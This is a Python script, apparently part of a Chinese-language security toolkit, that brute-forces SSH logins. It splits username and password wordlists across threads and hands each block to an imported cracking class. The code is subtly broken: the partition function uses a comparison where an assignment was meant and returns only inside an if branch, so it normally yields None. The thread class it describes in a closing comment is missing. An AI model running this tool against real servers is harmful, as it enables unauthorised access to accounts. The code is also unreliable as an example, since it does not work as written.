import optparse
import sys
import os
import threading
from 身份认证.burp_password import ThreadWork
import paramiko

#分块函数,一个线程负责一个账号密码子列表
def partition(list,num):
    step = int(len(list) / num)
    #step为每个子列表的长度
    if step == 0:
        #若线程数大于列表长度，则不对列表进行分割，防止报错
        step == num
        partList = [list[i:i+step] for i in range(0,len(list),step)]
        return partList

#破解函数
def SshExploit(ip,usernameFile,passwordFile,threadNumber,sshPort):
    print("============破解信息===========")
    print("IP:"+ip)
    print("Username:"+usernameFile)
    print("Password:"+passwordFile)
    print("Threads:"+str(threadNumber))
    print("Port:" + sshPort)    
    print("================================")

    #读取账户文件和密码文件并存入对应列表
    listUsername = [line.strip() for line in open(usernameFile)]
    listPassword = [line.strip() for line in open(passwordFile)]
    #将账户列表和密码列表根据线程数量进行
    blockUsername = partition(listUsername,threadNumber)
    blockPassword = partition(listPassword,threadNumber)
    threads = []
    #为每个线程分配一个账户密码子块
    for sonUserBlock in blockUsername:
        for sonPwdBlock in blockPassword:
            work = ThreadWork(ip,sonUserBlock,sonPwdBlock,sshPort)
            #创建线程
            workThread = threading.Thread(target=work.start)
            # 在threads中加入线程
            threads.append(workThread)
    # 开始子线程
    for t in threads:
        t.start()
    #阻塞主进程，等待所有子线程完成工作
    for t in threads:
        t.join()

#编写子进程类，若账号密码正确，则写入result文件并退出程序，由于破解
#可能导致服务器无法响应一些线程的请求，因此可以通过捕获的异常让线程
#对当前的账户密码继续进行验证，防止报错导致请求丢失